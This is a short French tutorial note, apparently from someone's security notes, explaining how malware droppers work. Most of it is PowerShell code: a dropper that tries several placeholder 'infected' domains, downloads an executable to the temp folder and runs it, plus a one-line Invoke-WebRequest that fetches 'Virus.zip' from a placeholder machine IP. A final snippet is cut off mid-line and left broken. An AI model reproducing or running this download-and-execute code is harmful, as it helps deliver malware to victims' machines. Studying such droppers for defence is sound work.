
La plupart des malwares ne sont pas distribué en un seul fichier et fonctionne en 2 étages :

## __Dropper___

### Exemple 1

Afin **télécharger** et d'**éxecuter** le malware **en mémoire**, on va faire éxecuter un **dropper** qui va faire appel à un domaine infecté pour télécharger notre payload.

Avec powershell ce code ressemblerai à cela :

```powershell
$wvh = new-object net.webclient;
$nsh='http://<InfectedDomain1>/trkldl@http://<InfectedDomain2>/adCa0ad@http://<InfectedDomain3>/bl4bl4c4r'.split("@");
$onj = '453';
$dxo=$env:temp+'\'+$onj+'.exe';
foreach($wzi in $nsh){
	try{
		$wvh.downloadfile($wzi, $dxo);
		if((get-item $dxo).length -ge 80000){
			invoke-item $dxo;
			break;
		}	
	}catch{}
}
```

Pour résumer ce payload va :
- **Creer un objet pour telecharger**
- **Faire une liste des liens où trouver le malware**
- **Télécharger** puis **executer** le premier fichier qui aura une taille > 80000

### Exemple 2

Windows 10 et + :

```powershell
Invoke-WebRequest -Uri http://<MACHINE_IP>/Virus.zip -outfile "virus.zip";
```

Windows 7 et - :

```powershell
# Creation d'un nouveau client web
$webClient = [System.Net.w]
```


## 